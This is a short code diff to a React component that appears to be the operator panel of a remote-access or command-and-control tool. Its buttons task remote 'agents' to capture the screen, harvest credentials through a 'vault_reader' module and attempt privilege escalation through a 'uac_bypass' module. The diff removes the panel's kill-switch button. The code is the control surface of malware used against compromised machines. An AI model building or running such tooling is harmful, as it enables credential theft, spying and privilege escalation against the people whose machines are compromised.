@@ -193,7 +193,6 @@ export default function AgentModal({ agent, onClose }) {
           <HeaderBtn label={isMobile ? '📸' : '⬜ Screenshot'} onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
           <HeaderBtn label={isMobile ? '⚷' : '⚷ Harvest'} cls="harvest" onClick={() => { api.createTask(agent.id, 'vault_reader', {}); showToast('🔑 Harvesting credentials...'); }} />
           <HeaderBtn label={isMobile ? '↑' : '↑ Escalate'} cls="escalate" onClick={() => { api.createTask(agent.id, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }} />
-          <HeaderBtn label={isMobile ? '✕' : '✕ Kill'} cls="kill" onClick={() => setShowKillConfirm(true)} />
           <button onClick={onClose} style={{
             background: 'none', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.5)',
             fontSize: 16, width: 30, height: 30, display: 'flex', alignItems: 'center', justifyContent: 'center',
